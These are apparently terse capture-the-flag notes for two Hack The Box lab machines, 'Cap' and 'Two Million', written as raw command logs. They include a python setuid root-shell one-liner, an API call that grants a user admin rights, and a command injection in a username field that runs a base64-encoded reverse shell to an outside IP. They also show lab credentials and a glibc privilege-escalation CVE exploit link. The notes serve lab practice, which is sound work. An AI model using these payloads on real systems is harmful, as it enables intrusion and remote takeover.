## Cap
```shell
./networkscan --quick <ip_address>
<ip_address>/data/1
<ip_address>/data/0
wireshark pcap file
ftp/ssh
username: nathan
password: Buck3tH4TF0RM3!
linpeas
https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/README.md
cat user.txt
https://gtfobins.org
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
cat /root/root.txt
```

## Two Million
```shell
./networkscan --quick <ip_address>
cat /etc/hosts
<ip_address> 2million.htb
2million.htb/invite
http://2million.htb/js/inviteapi.min.js
makeInviteCode()
Rot13 cipher: In order to generate the invite code, make a POST request to /api/v1/invite/generate
```
```js
function verifyInviteCode(code) {
  ...
}

function makeInviteCode() {
...
}
```
```shell
curl --data-raw '@string' 'http://2million.htb/api/v1/invite/generate'
{"0":200,"success":1,"data":{"code":"VEwxRjctWEhBTTUtMVpWVkwtRlJBVVo=","format":"encoded"}}
https://hashes.com/en/tools/hash_identifier
base 64
base64decode.org 
TL1F7-XHAM5-1ZVVL-FRAUZ
http://2million.htb/api/v1/user/vpn/generate
curl 2million.htb/api/v1 --cookie "PHPSESSID=<cookies>" 
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```
```shell
/api/v1/admin/vpn/generate
curl 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=<cookie>" --header "Content-Type: application/json" --data '{"email": "<email_login>", "is_admin": 1}'
# base64 encode bash -i >& /dev/tcp/10.10.15.106/9001 0>&1
curl 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=hhpd0s05ckta2rdca4md5lquuq" --header "Content-Type: application/json" --data '{"username":"<username>;echo <base64_encode_cmd> | base64 -d | bash;"}' -X POST >> ~/test.ovpn
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
su - admin
password: SuperDuperPass123
cat /home/admin/user.txt
cat /var/mail/admin
ch4p@2million.htb
CVE-2023-0386
ldd --version
CVE-2023-4911
https://haxx.in/files/gnu-acme.py
GLIBC_TUNABLES
cat /root/root.txt
```
